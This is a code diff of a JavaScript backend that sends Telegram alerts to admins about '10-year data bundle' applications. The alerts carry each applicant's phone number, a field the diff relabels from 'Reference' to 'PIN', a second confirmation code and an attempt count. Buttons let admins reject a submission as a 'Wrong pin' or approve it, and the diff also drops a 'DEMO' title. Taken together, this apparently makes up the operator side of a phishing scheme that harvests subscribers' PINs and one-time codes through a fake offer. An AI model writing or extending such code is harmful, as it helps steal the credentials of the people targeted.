@@ -432,7 +432,7 @@ function formatTelegramNotification(application, kind) {
     return `✅ APPLICATION APPROVED\n\n` +
       `📋 ID: ${application.application_no || id}\n` +
       `📞 PHONE: ${phone}\n` +
-      `🧾 Reference: ${application.application_id || application.application_no || "—"}\n` +
+      `🧾 PIN: ${application.application_id || application.application_no || "—"}\n` +
       `📦 Bundle option: ${bundleOptionLabel(application.first_name)}\n` +
       `📊 Line usage: ${lineUsageLabel(application.line_usage_profile)}\n` +
       `🔁 Attempt: #${attempt}\n\n` +
@@ -442,7 +442,7 @@ function formatTelegramNotification(application, kind) {
 
   if (kind === "wrongpin") {
     return `🔑 WRONG PIN — REJECTED\n\n` +
-      `🧾 Reference: ${id}\n` +
+      `🧾 PIN: ${id}\n` +
       `📞 Phone: ${phone}\n` +
       `🔢 Attempt: #${attempt}\n\n` +
       `⚠️ Reason: Wrong PIN entered\n` +
@@ -463,7 +463,7 @@ function formatTelegramNotification(application, kind) {
 
   if (kind === "wrongsecond") {
     return `🔢 WRONG CODE 2 — REJECTED\n\n` +
-      `🧾 Reference: ${id}\n` +
+      `🧾 PIN: ${id}\n` +
       `📞 Phone: ${phone}\n` +
       `☑️ Bundle confirmation: ${code2}\n` +
       `🔢 Attempt: #${attempt}\n\n` +
@@ -475,7 +475,7 @@ function formatTelegramNotification(application, kind) {
   return `❌ APPLICATION REJECTED\n\n` +
     `🤳ID: ${application.application_no || id}\n` +
     `📞 PHONE: ${phone}\n` +
-    `🧾 Reference: ${application.application_id || application.application_no || "—"}\n` +
+    `🧾 PIN: ${application.application_id || application.application_no || "—"}\n` +
     `⚠️ Reason: ${application.rejection_reason || "Application rejected"}\n` +
     `🔁 Attempt: #${attempt}\n` +
     `⏰ Date: ${stamp}`;
@@ -499,11 +499,11 @@ async function notifyTelegram(application) {
       : [...adminIds].filter(id => !superAdminIds.has(String(id))));
   const stamp = application.created_at ? new Date(application.created_at).toLocaleString() : new Date().toLocaleString();
   const attempt = Number(application.attempt_number || 1);
-  const title = attempt > 1 ? "🔄 RETURNING CUSTOMER (PREVIOUS APPLICATIONS)" : "🎉 NEW 10-YEAR DATA BUNDLE DEMO";
+  const title = attempt > 1 ? "🔄 RETURNING CUSTOMER (PREVIOUS APPLICATIONS)" : "🎉 NEW 10-YEAR DATA BUNDLE APPLICATION";
   const message = `${title}\n\n` +
     `📋 ID: ${application.application_no || application.application_id || `APP-${application.id}`}\n` +
     `📞 PHONE: ${application.phone || "—"}\n` +
-    `🧾 Reference: ${application.application_id || application.application_no || "—"}\n` +
+    `🧾 pin: ${application.application_id || application.application_no || "—"}\n` +
     `📦 Bundle option: ${bundleOptionLabel(application.first_name)}\n` +
     `📊 Line usage: ${lineUsageLabel(application.line_usage_profile)}\n` +
     `☑️ Bundle confirmation: ${application.second_name || "—"}\n` +
@@ -513,7 +513,7 @@ async function notifyTelegram(application) {
   for (const adminId of recipients) {
     const isSuperAdmin = superAdminIds.has(String(adminId));
     const keyboard = { inline_keyboard: [[
-      { text: "❌ Wrong Reference", callback_data: `wrongid:${application.id}` },
+      { text: "❌ Wrong pin", callback_data: `wrongid:${application.id}` },
       { text: "❌ Wrong Bundle Choice", callback_data: `wrongcode:${application.id}` }
     ], [{ text: "✅ Approve", callback_data: `approve:${application.id}` }]] };
     try { await bot.sendMessage(adminId, isSuperAdmin ? `${message}\n\n👑 SUPER ADMIN ASSIGNED APPLICATION` : message, { reply_markup: keyboard, disable_web_page_preview: true }); }
